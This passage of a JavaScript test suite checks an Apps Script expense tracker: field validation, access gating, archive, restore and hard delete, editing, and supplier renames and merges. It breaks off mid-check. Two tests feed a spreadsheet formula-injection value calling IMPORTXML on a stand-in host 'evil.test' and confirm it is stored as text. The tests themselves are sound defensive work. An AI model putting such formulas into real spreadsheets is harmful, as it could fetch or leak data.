check('rendered as a choice, not free text', patientField.type === 'choice', patientField);
check('carrying the family, as initials', (patientField.options || []).join() === 'J,K,A,P',
  patientField.options);
check('and it is still required', patientField.required === true);
check('no autocomplete role, because there is nothing to guess at',
  !patientField.role, patientField.role);

const reasonField = G.uiFormFields(G.getSection('work'))
  .filter(f => f.header === 'Expense Reason')[0];
check('Work\'s Expense Reason stays free text with suggestions',
  reasonField.type === 'text' && reasonField.role === 'category', reasonField);

check('uiCategoryValues returns the declared list for a closed category',
  G.uiCategoryValues('health').join() === 'J,K,A,P', G.uiCategoryValues('health'));

// The page's filter needs the declared values to be stable the way the status
// filter is - built from config rather than from whatever the rows happen to
// hold, which is what stopped v1 growing one option per claim date.
check('the section metadata carries the declared values for the filter',
  G.uiSectionMeta('health').category.options.join() === 'J,K,A,P',
  G.uiSectionMeta('health').category);
check('an open category declares none, so the filter falls back to the data',
  G.uiSectionMeta('work').category.options.length === 0,
  G.uiSectionMeta('work').category);

// The page renders a dropdown; google.script.run does not have to go through
// the page, so the list is only closed if the server closes it.
let notAPatient = null;
try {
  G.uiCreateEntry('health', {
    values: { 'Date': '2026-09-10', 'Counterparty': 'White Clinic', 'Patient': 'Q',
              'Invoice Date': '2026-09-10', 'Amount': 40 }
  });
} catch (e) { notAPatient = e.message; }
check('a patient off the list is refused, and the list is named',
  /must be one of/.test(notAPatient || '') && /J, K, A, P/.test(notAPatient || ''), notAPatient);

const realPatient = G.uiCreateEntry('health', {
  values: { 'Date': '2026-09-10', 'Counterparty': 'White Clinic', 'Patient': 'P',
            'Invoice Date': '2026-09-10', 'Amount': 40 }
});
check('one on the list goes through', realPatient.ok === true, realPatient.error);

// The same rule generically, which is what makes it worth having on the server:
// Type is a choice in Work and Health and was previously unchecked.
let badType = null;
try {
  G.uiCreateEntry('work', {
    values: { 'Date': '2026-09-10', 'Counterparty': 'Bolt', 'Expense Reason': 'trip',
              'Type': 'Submarine', 'Amount': 5 }
  });
} catch (e) { badType = e.message; }
check('any choice field is checked, not just the category',
  /Type must be one of/.test(badType || ''), badType);

section('an open category populates itself from what is used');
const reasons = G.uiCategoryValues('work');
check('a value entered earlier comes back as a suggestion',
  reasons.indexOf('Lisbon trip') !== -1, reasons);
check('a section with no category offers nothing', G.uiCategoryValues('iva').length === 0);

/* -------------------------------- gating --------------------------------- */
section('every form function checks the caller');
mocks.Session._setActiveUser('someone.else@example.test');
[
  ['uiCreateEntry', ['work', { values: {} }]],
  ['uiCategoryValues', ['health']],
  ['uiSuggestCounterparty', ['w', 5]],
  ['uiLookupCounterparty', ['iva', 'Worten']]
].forEach(([name, args]) => {
  let refused = null;
  try { G[name].apply(null, args); } catch (e) { refused = e.message; }
  check(`${name} is gated`, /Not authorized/.test(refused || ''), refused);
});
const rowsBeforeStranger = mocks._ss.getSheetByName('Work').getLastRow();
mocks.Session._setActiveUser(mocks.Session._owner);
check('and the stranger wrote no row',
  mocks._ss.getSheetByName('Work').getLastRow() === rowsBeforeStranger);

// The one path that accepts outside values is the one that most needs escaping.
section('a formula typed into the form is stored as text');
const injected = G.uiCreateEntry('work', {
  values: {
    'Date': '2026-09-05', 'Counterparty': '=IMPORTXML("http://evil.test","//x")',
    'Expense Reason': 'test', 'Amount': 1
  }
});
check('stored escaped, never evaluated',
  mocks._ss.getSheetByName('Work').getRange(injected.row, wcols['Counterparty'])
    .getValue().toString().indexOf("'=") === 0,
  mocks._ss.getSheetByName('Work').getRange(injected.row, wcols['Counterparty']).getValue());

/* ====================== step 9: archive and deletion ====================== */
/*
 * Deleting removes nothing. The safeguard on permanent deletion is structural -
 * hardDeleteEntry() cannot see the live sheet - so most of what is worth
 * testing is that the structure holds, not that a dialog appeared.
 */
section('bootstrap() creates an archive sheet per section');
['Work', 'IVA', 'Health', 'Income'].forEach(name => {
  check(`${name} Archive exists`, !!mocks._ss.getSheetByName(name + ' Archive'));
});
check('its headers are the section spine plus the archive columns',
  G.archiveHeaders(G.getSection('income')).slice(-2).join() === 'Archived,Archive Reason',
  G.archiveHeaders(G.getSection('income')));
check('generated from the same sectionHeaders(), so the pair cannot drift',
  G.archiveHeaders(G.getSection('health')).slice(0, -2).join() ===
  G.sectionHeaders(G.getSection('health')).join());
check('archive sheets are not reported as unrecognised tabs',
  G.bootstrap().unrecognisedSheets.every(name => !/Archive$/.test(name)),
  G.bootstrap().unrecognisedSheets);

section('delete archives the row rather than removing it');
const toArchive = G.uiCreateEntry('work', {
  values: { 'Date': '2026-10-01', 'Counterparty': 'Doomed Ltd', 'Expense Reason': 'gone',
            'Amount': 8, 'Notes': 'archive me' },
  files: [{ header: 'Receipt URL', name: 'doomed.pdf', mimeType: 'application/pdf', data: b64 }]
});
const doomedFile = mocks.DriveApp.getFileById(G.extractFileId(
  mocks._ss.getSheetByName('Work').getRange(toArchive.row, wcols['Receipt URL']).getValue()));
const liveRowsBefore = G.uiListEntries('work').rows.length;

const archived = G.uiArchiveEntry('work', toArchive.row);
check('reported ok', archived.ok === true, archived);
check('gone from the live table', G.uiListEntries('work').rows.length === liveRowsBefore - 1);
check('and no live row still carries it',
  !G.uiListEntries('work').rows.some(r => r.cells['Counterparty'] === 'Doomed Ltd'));
check('the document moved to Archived, not to the trash',
  doomedFile.parent.getName() === 'Archived' && !doomedFile.isTrashed(),
  [doomedFile.parent.getName(), doomedFile.isTrashed()]);

const archiveList = G.uiListArchive('work');
const archivedRow = archiveList.rows.filter(r => r.cells['Counterparty'] === 'Doomed Ltd')[0];
check('it is in the archive', !!archivedRow, archiveList.rows.map(r => r.cells['Counterparty']));
check('with every field carried across',
  archivedRow.cells['Amount'] === 8 && archivedRow.cells['Notes'] === 'archive me',
  archivedRow.cells);
check('stamped with when it was archived', !!archivedRow.archivedAt, archivedRow.archivedAt);
// The reason is withheld when it is the ordinary one: deleting from the table is
// the only way in today, so a "deleted" chip on every row distinguishes nothing.
// Anything else is still reported, which is what a bulk archive at cutover would
// be. Held here rather than in the page so this stays a rule and not a habit.
check('but not told "deleted" on every row, which says nothing',
  archivedRow.reason === '', archivedRow.reason);
check('while any other reason is still reported', (() => {
  const sheet = mocks.SpreadsheetApp.getActiveSpreadsheet().getSheetByName('Work Archive');
  const cols = G.resolveColumns(sheet);
  G.writeCell(sheet, cols, archivedRow.row, 'Archive Reason', 'archived');
  const again = G.uiListArchive('work').rows.filter(r => r.row === archivedRow.row)[0];
  G.writeCell(sheet, cols, archivedRow.row, 'Archive Reason', 'deleted');
  return again.reason === 'archived';
})());
check('offering no status transitions, because there are none',
  archivedRow.options.length === 0, archivedRow.options);

section('restore puts it back, and re-files the document');
const restored = G.uiRestoreEntry('work', archivedRow.row);
check('reported ok', restored.ok === true, restored);
check('back in the live table',
  G.uiListEntries('work').rows.some(r => r.cells['Counterparty'] === 'Doomed Ltd'));
check('and out of the archive',
  !G.uiListArchive('work').rows.some(r => r.cells['Counterparty'] === 'Doomed Ltd'),
  G.uiListArchive('work').rows.map(r => r.cells['Counterparty']));
// Re-filed by applyFileState rather than moved back to where it came from, so
// the folder and the suffix chain are both rebuilt from the row's own dates.
check('the document is filed by its status again, not left in Archived',
  doomedFile.parent.getName() === 'Inbox', doomedFile.parent.getName());
check('nothing was lost on the way round',
  restored.entry.cells['Notes'] === 'archive me' && restored.entry.cells['Amount'] === 8,
  restored.entry.cells);

section('hard delete reaches the archive and nothing else');
const toDestroy = G.uiCreateEntry('work', {
  values: { 'Date': '2026-10-02', 'Counterparty': 'Really Doomed', 'Expense Reason': 'x', 'Amount': 3 },
  files: [{ header: 'Receipt URL', name: 'rd.pdf', mimeType: 'application/pdf', data: b64 }]
});
const destroyFile = mocks.DriveApp.getFileById(G.extractFileId(
  mocks._ss.getSheetByName('Work').getRange(toDestroy.row, wcols['Receipt URL']).getValue()));
G.uiArchiveEntry('work', toDestroy.row);
const destroyRow = G.uiListArchive('work')
  .rows.filter(r => r.cells['Counterparty'] === 'Really Doomed')[0];

const destroyed = G.uiHardDeleteEntry('work', destroyRow.row);
check('reported ok', destroyed.ok === true, destroyed);
check('gone from the archive too',
  !G.uiListArchive('work').rows.some(r => r.cells['Counterparty'] === 'Really Doomed'));
// Trashed, not purged: 30 days in Drive's trash is the difference between a
// mistake and a loss.
check('the document is in Drive\'s trash, not obliterated',
  destroyFile.isTrashed() === true && destroyed.filesTrashed === 1, destroyed);

/*
 * The safeguard that matters. Live data cannot be destroyed in one action
 * because the function that destroys things operates on the archive sheet -
 * a row number that means something live is simply a different row there.
 */
section('hard delete cannot reach a live row');
const liveTarget = G.uiListEntries('work').rows[0];
const liveCounterparty = liveTarget.cells['Counterparty'];
const archiveHeight = mocks._ss.getSheetByName('Work Archive').getLastRow();
let reachedLive = null;
try { G.uiHardDeleteEntry('work', liveTarget.row); } catch (e) { reachedLive = e.message; }
check('the live row is untouched whatever happened',
  G.uiListEntries('work').rows.some(r => r.cells['Counterparty'] === liveCounterparty),
  liveCounterparty);
check('because the row number was resolved against the archive, not the section',
  mocks._ss.getSheetByName('Work Archive').getLastRow() <= archiveHeight || !!reachedLive);

/* --------------------------- edit in place -------------------------------- */
section('editing runs the same validation as creating');
['work', 'iva', 'health', 'income'].forEach(key => {
  const s = G.getSection(key);
  const stateDates = s.states.map(st => st.dateColumn).filter(Boolean);
  check(`${key}: edit drops the state dates, which the chips own`,
    G.uiEditFields(s).every(f => stateDates.indexOf(f.header) === -1),
    G.uiEditFields(s).map(f => f.header).filter(h => stateDates.indexOf(h) !== -1));
  check(`${key}: and keeps everything else the form asks for`,
    G.uiEditFields(s).length ===
    G.uiFormFields(s).filter(f => stateDates.indexOf(f.header) === -1).length);
});

const edited = G.uiCreateEntry('work', {
  values: { 'Date': '2026-11-01', 'Counterparty': 'Typo Ltd', 'Expense Reason': 'wrong',
            'Amount': 10, 'Notes': 'first' },
  files: [{ header: 'Receipt URL', name: 'e.pdf', mimeType: 'application/pdf', data: b64 }]
});
const editedFile = mocks.DriveApp.getFileById(G.extractFileId(
  mocks._ss.getSheetByName('Work').getRange(edited.row, wcols['Receipt URL']).getValue()));
check('the document starts named after the original values',
  editedFile.getName() === '261101_TypoLtd_10-00_receipt.pdf', editedFile.getName());

const afterEdit = G.uiUpdateEntry('work', edited.row, {
  values: { 'Counterparty': 'Fixed Ltd', 'Amount': 25.5, 'Date': '2026-11-02', 'Notes': '' }
});
check('the edit reports ok', afterEdit.ok === true, afterEdit);
check('values changed', afterEdit.entry.cells['Counterparty'] === 'Fixed Ltd' &&
  afterEdit.entry.cells['Amount'] === 25.5, afterEdit.entry.cells);
// Unlike creating, a blank CLEARS - otherwise there is no way to empty a note.
check('a supplied blank clears the field', afterEdit.entry.cells['Notes'] === '',
  afterEdit.entry.cells['Notes']);
check('a field that was not sent is left alone',
  afterEdit.entry.cells['Expense Reason'] === 'wrong', afterEdit.entry.cells);
// The filename is built from date, counterparty and amount, so editing any of
// them makes the existing name wrong.
check('the document was renamed to match the edited row',
  editedFile.getName() === '261102_FixedLtd_25-50_receipt.pdf', editedFile.getName());

section('editing refuses exactly what creating refuses');
[
  [{ 'Nonsense': 1 }, /not a field/, 'an unknown field'],
  [{ 'Receipt URL': 'https://drive.google.com/file/d/aaaaaaaaaaaaaaaaaaaaaaaaaaa/view' },
    /cannot be set directly/, 'a document as a value'],
  [{ 'Date': '02/11/2026' }, /valid yyyy-MM-dd/, 'a badly formatted date'],
  [{ 'Type': 'Submarine' }, /must be one of/, 'a choice off its list']
].forEach(([values, pattern, what]) => {
  let refused = null;
  try { G.uiUpdateEntry('work', edited.row, { values: values }); } catch (e) { refused = e.message; }
  check(`${what} is refused`, pattern.test(refused || ''), refused);
});

// A state date sent through the edit path would bypass setEntryDate's rule that
// a date cannot be set for a state the row has not reached.
let stateDateViaEdit = null;
try {
  G.uiUpdateEntry('income', G.uiListEntries('income').rows[0].row,
    { values: { 'Logged Date': '2026-11-05' } });
} catch (e) { stateDateViaEdit = e.message; }
check('a state date cannot be smuggled through the edit path',
  /not a field/.test(stateDateViaEdit || ''), stateDateViaEdit);

section('attaching a document later releases the deferred claim');
// The Siri case: the entry is made without its receipt, so the claim is held.
const deferred = G.uiCreateEntry('iva', {
  values: { 'Date': '2026-11-03', 'Counterparty': 'FNAC', 'Número': 'B9',
            'Emitente NIF': '500000000', 'IVA Amount': 1, 'Amount': 6 }
});
const ed_mailBefore = mocks.MailApp.sent.length;
check('nothing claimed yet, because the document is not there',
  G.uiEntry('iva', deferred.row).claimEmailed === false,
  G.uiEntry('iva', deferred.row).claimEmailed);

const attached = G.uiUpdateEntry('iva', deferred.row, {
  values: {},
  files: [{ header: 'Receipt URL', name: 'late.pdf', mimeType: 'application/pdf', data: b64 }]
});
check('now it is attached', attached.entry.receiptState === 'attached', attached.entry.receiptState);
check('and the claim went out', mocks.MailApp.sent.length === ed_mailBefore + 1,
  mocks.MailApp.sent.length - ed_mailBefore);
check('stamped, so it cannot go twice', attached.entry.claimEmailed === true);
const mailAfter = mocks.MailApp.sent.length;
G.uiUpdateEntry('iva', deferred.row, { values: { 'Notes': 'edited again' } });
check('editing again sends nothing further', mocks.MailApp.sent.length === mailAfter,
  mocks.MailApp.sent.length - mailAfter);

// The edit path writes through writeCell, which escapes - but that is a
// property of writeCell rather than of this code, so it is worth pinning here
// too. createEntry has its own version of this test.
section('a formula typed into the edit form is stored as text');
G.uiUpdateEntry('work', edited.row, {
  values: { 'Counterparty': '=IMPORTXML("http://evil.test","//x")' }
});
check('stored escaped, never evaluated',
  mocks._ss.getSheetByName('Work').getRange(edited.row, wcols['Counterparty'])
    .getValue().toString().indexOf("'=") === 0,
  mocks._ss.getSheetByName('Work').getRange(edited.row, wcols['Counterparty']).getValue());
G.uiUpdateEntry('work', edited.row, { values: { 'Counterparty': 'Fixed Ltd' } });

// A failed upload must change nothing at all, rather than applying the field
// edits and leaving the document missing.
section('a failed upload during an edit leaves the row untouched');
const beforeEdit = G.uiEntry('work', edited.row).cells['Notes'];
const liveBeforeEdit = Object.keys(mocks._files).filter(id => !mocks._files[id].trashed).length;
let editUploadFailed = null;
try {
  G.uiUpdateEntry('work', edited.row, {
    values: { 'Notes': 'should not survive' },
    files: [{ header: 'Receipt URL', name: 'big.pdf', mimeType: 'application/pdf',
              data: 'x'.repeat(20 * 1024 * 1024) }]
  });
} catch (e) { editUploadFailed = e.message; }
check('refused', /too large/.test(editUploadFailed || ''), editUploadFailed);
check('and the field edit was not applied either',
  G.uiEntry('work', edited.row).cells['Notes'] === beforeEdit,
  G.uiEntry('work', edited.row).cells['Notes']);
check('and nothing was added to Drive',
  Object.keys(mocks._files).filter(id => !mocks._files[id].trashed).length === liveBeforeEdit);

section('replacing a document does not strand the old one');
const oldFileId = G.extractFileId(
  mocks._ss.getSheetByName('Work').getRange(edited.row, wcols['Receipt URL']).getValue());
G.uiUpdateEntry('work', edited.row, {
  values: {},
  files: [{ header: 'Receipt URL', name: 'replacement.pdf', mimeType: 'application/pdf', data: b64 }]
});
const newFileId = G.extractFileId(
  mocks._ss.getSheetByName('Work').getRange(edited.row, wcols['Receipt URL']).getValue());
check('the row points at the new document', newFileId !== oldFileId);
check('and the replaced one is in the trash, not left as an orphan',
  mocks.DriveApp.getFileById(oldFileId).isTrashed() === true);
check('the new one is named from the row like any other',
  mocks.DriveApp.getFileById(newFileId).getName() === '261102_FixedLtd_25-50_receipt.pdf',
  mocks.DriveApp.getFileById(newFileId).getName());

section('management functions check the caller');
mocks.Session._setActiveUser('someone.else@example.test');
[
  ['uiArchiveEntry', ['work', 2]],
  ['uiRestoreEntry', ['work', 2]],
  ['uiHardDeleteEntry', ['work', 2]],
  ['uiListArchive', ['work']]
].forEach(([name, args]) => {
  let refused = null;
  try { G[name].apply(null, args); } catch (e) { refused = e.message; }
  check(`${name} is gated`, /Not authorized/.test(refused || ''), refused);
});
mocks.Session._setActiveUser(mocks.Session._owner);

// Income has no documents at all, so archiving must not go looking for a folder.
section('archiving a section with no documents asks Drive for nothing');
const incomeToGo = G.uiCreateEntry('income', {
  values: { 'Date': '2026-10-03', 'Counterparty': 'Client X', 'Amount': 500 }
});
const incomeArchived = G.uiArchiveEntry('income', incomeToGo.row);
check('archived cleanly', incomeArchived.ok === true && incomeArchived.files.length === 0,
  incomeArchived);
check('and it is in the Income archive',
  G.uiListArchive('income').rows.some(r => r.cells['Counterparty'] === 'Client X'));

/* ========================================================================== *
 * Step 9c — supplier editing, with the rename propagated
 * ========================================================================== */

/* A supplier's name is written into three places that must agree: the entry
 * rows, the Drive filenames built from them, and the registry itself. These
 * tests exist because getting two of the three right is the failure that looks
 * like success. */

function supplierRow(name) {
  const rows = G.uiListSuppliers().suppliers.filter(s => s.name === name);
  return rows.length ? rows[0].row : null;
}
function supplierNamed(name) {
  return G.uiListSuppliers().suppliers.filter(s => s.name === name)[0] || null;
}
function fileNameFor(sheetName, row) {
  const sheet = mocks._ss.getSheetByName(sheetName);
  const col = G.resolveColumns(sheet)['Receipt URL'];
  const id = G.extractFileId(sheet.getRange(row, col).getValue());
  return id ? mocks.DriveApp.getFileById(id).getName() : null;
}
function counterpartyAt(sheetName, row) {
  const sheet = mocks._ss.getSheetByName(sheetName);
  return sheet.getRange(row, G.resolveColumns(sheet)['Counterparty']).getValue();
}

section('a plain rename reaches the row, the document and the registry');
const rn1 = G.uiCreateEntry('work', {
  values: { 'Date': '2026-03-04', 'Counterparty': 'Whitee Clinicx', 'Expense Reason': 'r',
            'Amount': 40 },
  files: [{ header: 'Receipt URL', name: 'r.pdf', mimeType: 'application/pdf', data: b64 }]
});
check('created with the misspelling in the filename',
  fileNameFor('Work', rn1.row) === '260304_WhiteeClinicx_40-00_receipt.pdf',
  fileNameFor('Work', rn1.row));

const renamed = G.uiUpdateSupplier(supplierRow('Whitee Clinicx'), {
  name: 'Whitex Clinic', type: '', nif: '', aliases: '', was: 'Whitee Clinicx'
});
check('reported ok and complete', renamed.ok === true && renamed.incomplete === false, renamed);
check('one entry row changed', renamed.repair.rowsChanged === 1, renamed.repair);
check('the row now holds the new name', counterpartyAt('Work', rn1.row) === 'Whitex Clinic',
  counterpartyAt('Work', rn1.row));
check('the document was rebuilt from the row, not string-patched',
  fileNameFor('Work', rn1.row) === '260304_WhitexClinic_40-00_receipt.pdf',
  fileNameFor('Work', rn1.row));
check('the registry entry was renamed', supplierNamed('Whitex Clinic') !== null);
check('and the old registry entry is gone', supplierNamed('Whitee Clinicx') === null);
check('the old spelling is OFFERED as an alias, not added',
  renamed.aliasOffer && renamed.aliasOffer.alias === 'Whitee Clinicx' &&
  supplierNamed('Whitex Clinic').aliases === '',
  { offer: renamed.aliasOffer, aliases: supplierNamed('Whitex Clinic').aliases });

section('accepting the alias offer is a second, separate act');
G.uiAddSupplierAlias(renamed.aliasOffer.name, renamed.aliasOffer.alias);
check('now stored', supplierNamed('Whitex Clinic').aliases === 'Whitee Clinicx',
  supplierNamed('Whitex Clinic').aliases);
check('and the mishearing resolves to it at alias confidence',
  G.findSupplier('whitee clinicx').name === 'Whitex Clinic' &&
  G.findSupplier('whitee clinicx').confidence === 0.95,
  G.findSupplier('whitee clinicx'));

// The archive carries the same spine and restoreEntry rebuilds names from the
// row, so a rename that skipped it would sit quietly until a restore brought
// the old spelling back.
section('the rename reaches archived rows, and does not un-archive their files');
const arch = G.uiCreateEntry('work', {
  values: { 'Date': '2026-03-05', 'Counterparty': 'Stale Namee', 'Expense Reason': 'r',
            'Amount': 12 },
  files: [{ header: 'Receipt URL', name: 'a.pdf', mimeType: 'application/pdf', data: b64 }]
});
const archFileId = G.extractFileId(
  mocks._ss.getSheetByName('Work')
    .getRange(arch.row, G.resolveColumns(mocks._ss.getSheetByName('Work'))['Receipt URL'])
    .getValue());
G.uiArchiveEntry('work', arch.row);
check('the file is in Archived to begin with',
  mocks.DriveApp.getFileById(archFileId).parent.getName() === 'Archived',
  mocks.DriveApp.getFileById(archFileId).parent.getName());

const archRenamed = G.uiUpdateSupplier(supplierRow('Stale Namee'), {
  name: 'Stale Name', type: '', nif: '', aliases: '', was: 'Stale Namee'
});
const archRow = archRenamed.repair.rows[0];
check('the archived row was the one repaired',
  archRow && archRow.archived === true && archRow.sheet === 'Work Archive', archRow);
check('its Counterparty was corrected',
  counterpartyAt('Work Archive', archRow.row) === 'Stale Name',
  counterpartyAt('Work Archive', archRow.row));
check('its document was renamed',
  mocks.DriveApp.getFileById(archFileId).getName() === '260305_StaleName_12-00_receipt.pdf',
  mocks.DriveApp.getFileById(archFileId).getName());
check('and it is STILL in Archived, not re-filed by status',
  mocks.DriveApp.getFileById(archFileId).parent.getName() === 'Archived',
  mocks.DriveApp.getFileById(archFileId).parent.getName());
check('restoring it brings back the corrected name, not the old one',
  G.uiRestoreEntry('work', archRow.row).entry.cells['Counterparty'] === 'Stale Name');

// Correcting a typo usually means the right name already exists. A rename that
// silently created a THIRD supplier would be the original bug with more steps.
section('renaming onto an existing supplier MERGES rather than duplicating');
const mergeSrc = G.uiCreateEntry('health', {
  values: { 'Date': '2026-03-06', 'Counterparty': 'Whte Clinic', 'Patient': 'J',
            'Invoice Date': '2026-03-06', 'Amount': 60, 'Type': 'Dentist' }
});
const whiteBefore = supplierNamed('White Clinic');
const srcBefore = supplierNamed('Whte Clinic');
const merged = G.uiUpdateSupplier(supplierRow('Whte Clinic'), {
  name: 'white clinic', type: 'Dentist', nif: '', aliases: 'whte', was: 'Whte Clinic'
});
check('reported as a merge', merged.ok === true && merged.merged &&
  merged.merged.into === 'White Clinic', merged);
check('the surviving spelling is the target\'s, not the one typed',
  counterpartyAt('Health', mergeSrc.row) === 'White Clinic',
  counterpartyAt('Health', mergeSrc.row));
check('the source registry row is gone', supplierNamed('Whte Clinic') === null);
check('no third supplier was created', supplierNamed('white clinic') === null);
check('Times Used summed',
  supplierNamed('White Clinic').timesUsed === whiteBefore.timesUsed + srcBefore.timesUsed,
  { now: supplierNamed('White Clinic').timesUsed,
    was: whiteBefore.timesUsed, plus: srcBefore.timesUsed });
check('aliases were unioned, keeping the target\'s',
  supplierNamed('White Clinic').aliases.indexOf('wite clinic') !== -1 &&
  supplierNamed('White Clinic').aliases.indexOf('whte') !== -1,
  supplierNamed('White Clinic').aliases);
check('the source\'s Type filled the target\'s empty one',
  supplierNamed('White Clinic').type === 'Dentist', supplierNamed('White Clinic').type);

section('a merge target may be matched by one of its ALIASES');
G.uiCreateEntry('health', {
  values: { 'Date': '2026-03-07', 'Counterparty': 'Alias Bait', 'Patient': 'K',
            'Invoice Date': '2026-03-07', 'Amount': 20 }
});
const byAlias = G.uiUpdateSupplier(supplierRow('Alias Bait'), {
  name: 'wite clinic', type: '', nif: '', aliases: '', was: 'Alias Bait'
});
check('folded into the supplier that owns the alias',
  byAlias.merged && byAlias.merged.into === 'White Clinic', byAlias);
check('rather than becoming a name that collides with an alias',
  supplierNamed('wite clinic') === null);

section('a merge applies the clear-on-conflict rule to Type');
G.uiCreateEntry('health', {
  values: { 'Date': '2026-03-08', 'Counterparty': 'Conflicto', 'Patient': 'A',
            'Invoice Date': '2026-03-08', 'Amount': 30, 'Type': 'Optician' }
});
const conflicted = G.uiUpdateSupplier(supplierRow('Conflicto'), {
  name: 'White Clinic', type: 'Optician', nif: '', aliases: '', was: 'Conflicto'
});
check('the disagreement is reported', conflicted.typeCleared === true, conflicted);
check('and the stored default is cleared rather than guessed',
  supplierNamed('White Clinic').type === '', supplierNamed('White Clinic').type);

// NIF is a fact about the supplier, not about the visit, so recordSupplier never
// clears it. A merge must not be the one place that does.
section('a merge keeps the established NIF and reports the one it displaced');
G.uiCreateEntry('iva', {
  values: { 'Date': '2026-03-09', 'Counterparty': 'Fnacc', 'Número': '1',
            'Emitente NIF': '999999999', 'IVA Amount': 1, 'Amount': 10 },
  files: [{ header: 'Receipt URL', name: 'f.pdf', mimeType: 'application/pdf', data: b64 }]
});
const nifMerge = G.uiUpdateSupplier(supplierRow('Fnacc'), {
  name: 'FNAC', type: '', nif: '999999999', aliases: '', was: 'Fnacc'
});
check('the established NIF survives', supplierNamed('FNAC').nif === '500000000',
  supplierNamed('FNAC').nif);
check('and the displaced one is reported, not silently dropped',
  nifMerge.nifKept && nifMerge.nifKept.kept === '500000000' &&
  nifMerge.nifKept.discarded === '999999999', nifMerge.nifKept);
check('named, so the warning can send you to a specific supplier',
  nifMerge.nifKept.into === 'FNAC', nifMerge.nifKept);
check('nothing was adopted', nifMerge.nifAdopted === null, nifMerge.nifAdopted);

// The core keeping its NIF is right almost every time, but the two ways the core
// can end up holding a number nobody checked both have to be visible BEFORE the
// merge, which is the only point you can still back out.
section('the preview warns about the NIF before anything is merged');
G.uiCreateEntry('iva', {
  values: { 'Date': '2026-03-13', 'Counterparty': 'Wortenn', 'Número': '2',
            'Emitente NIF': '111111111', 'IVA Amount': 1, 'Amount': 10 }
});
const nifPreview = G.uiSupplierPreview(supplierRow('Wortenn'), 'Worten', '111111111');
check('the conflict is reported up front',
  nifPreview.nifKept && nifPreview.nifKept.kept === '500000001' &&
  nifPreview.nifKept.discarded === '111111111', nifPreview.nifKept);
check('and it agrees with what the merge then does',
  G.uiUpdateSupplier(supplierRow('Wortenn'), {
    name: 'Worten', type: '', nif: '111111111', aliases: '', was: 'Wortenn'
  }).nifKept.kept === nifPreview.nifKept.kept);

// The quieter half: the core has NO NIF, so it inherits the typo's. If that
// number was wrong the core is now wrong, and before this nothing said so.
section('a merge into a supplier with no NIF reports what it adopted');
G.uiCreateEntry('health', {
  values: { 'Date': '2026-03-14', 'Counterparty': 'Adopter Co', 'Patient': 'J',
            'Invoice Date': '2026-03-14', 'Amount': 15 }
});
G.uiCreateEntry('health', {
  values: { 'Date': '2026-03-14', 'Counterparty': 'Adoptor Co', 'Patient': 'J',
            'Invoice Date': '2026-03-14', 'Amount': 15 }
});
const adoptPreview = G.uiSupplierPreview(supplierRow('Adoptor Co'), 'Adopter Co', '222222222');
check('the preview says the core will inherit it',
  adoptPreview.nifAdopted && adoptPreview.nifAdopted.value === '222222222' &&
  adoptPreview.nifAdopted.into === 'Adopter Co', adoptPreview.nifAdopted);
const adopted = G.uiUpdateSupplier(supplierRow('Adoptor Co'), {
  name: 'Adopter Co', type: '', nif: '222222222', aliases: '', was: 'Adoptor Co'
});
check('the merge reports it too', adopted.nifAdopted &&
  adopted.nifAdopted.value === '222222222', adopted.nifAdopted);
check('and the core actually holds it now',
  supplierNamed('Adopter Co').nif === '222222222', supplierNamed('Adopter Co').nif);

// Agreeing NIFs are not news, and a warning on every merge is one you learn to
// ignore - which would cost the two above their meaning.
section('matching NIFs produce no warning at all');
G.uiCreateEntry('iva', {
  values: { 'Date': '2026-03-15', 'Counterparty': 'Fnacx', 'Número': '3',
            'Emitente NIF': '500000000', 'IVA Amount': 1, 'Amount': 10 }
});
const quiet = G.uiUpdateSupplier(supplierRow('Fnacx'), {
  name: 'FNAC', type: '', nif: '500000000', aliases: '', was: 'Fnacx'
});
check('nothing kept, nothing adopted',
  quiet.nifKept === null && quiet.nifAdopted === null, quiet);
check('and the NIF is untouched', supplierNamed('FNAC').nif === '500000000');

// The preview must describe the save that is actually about to happen, or the
// confirmation is a guess. Omitting the NIF means "unchanged", not "cleared".
section('the preview defaults to the stored NIF when the caller omits it');
check('same verdict as passing it explicitly',
  JSON.stringify(G.uiSupplierPreview(supplierRow('Adopter Co'), 'FNAC').nifKept) ===
  JSON.stringify(G.uiSupplierPreview(supplierRow('Adopter Co'), 'FNAC', '222222222').nifKept),
  G.uiSupplierPreview(supplierRow('Adopter Co'), 'FNAC').nifKept);
// Decided 12 Aug 2026, not deferred: a submitted claim records what was
// SUBMITTED, so rewriting it after the fact makes the row disagree with what
// Financas received. This assertion is what stops that being reintroduced.
check('a corrected NIF is never backdated onto past IVA entries',
  mocks._ss.getSheetByName('IVA')
    .getRange(G.uiListEntries('iva').rows.filter(r => r.cells['Número'] === '1')[0].row,
      G.resolveColumns(mocks._ss.getSheetByName('IVA'))['Emitente NIF']).getValue() === '999999999');

section('a case-only rename still rebuilds the filenames');
const caseOnly = G.uiCreateEntry('work', {
  values: { 'Date': '2026-03-10', 'Counterparty': 'acme services', 'Expense Reason': 'r',
            'Amount': 5 },
  files: [{ header: 'Receipt URL', name: 'c.pdf', mimeType: 'application/pdf', data: b64 }]
});
G.uiUpdateSupplier(supplierRow('acme services'), {
  name: 'ACME Services', type: '', nif: '', aliases: '', was: 'acme services'
});
check('the slug follows the new casing',
  fileNameFor('Work', caseOnly.row) === '260310_ACMEServices_5-00_receipt.pdf',
  fileNameFor('Work', caseOnly.row));

section('the preview reports the blast radius without touching anything');
G.uiCreateEntry('work', {
  values: { 'Date': '2026-03-11', 'Counterparty': 'Countme', 'Expense Reason': 'r', 'Amount': 1 }
});
G.uiCreateEntry('health', {
  values: { 'Date': '2026-03-11', 'Counterparty': 'Countme', 'Patient': 'P',
            'Invoice Date': '2026-03-11', 'Amount': 2 }
});
const preview = G.uiSupplierPreview(supplierRow('Countme'), 'White Clinic');
check('counts every affected row', preview.total === 2, preview);
check('and says which sections', preview.bySection.length === 2, preview.bySection);
check('recognises the merge before it happens',
  preview.merge && preview.merge.name === 'White Clinic', preview.merge);
check('changed nothing', counterpartyAt('Work', G.uiListEntries('work').rows
  .filter(r => r.cells['Counterparty'] === 'Countme')[0].row) === 'Countme');

// Apps Script kills an execution at six minutes, so the work stops at a known
// point instead - and the registry must not move until every row is done, or a
// merge would delete the supplier that the second pass needs.
section('a run that hits the row limit leaves the registry alone');
const capped = G.uiListSuppliers().suppliers.filter(s => s.name === 'Countme')[0];
const cappedRun = G.updateSupplier(capped.row, {
  name: 'White Clinic', type: '', nif: '', aliases: '', was: 'Countme'
}, 1);
check('reported as incomplete, not as success',
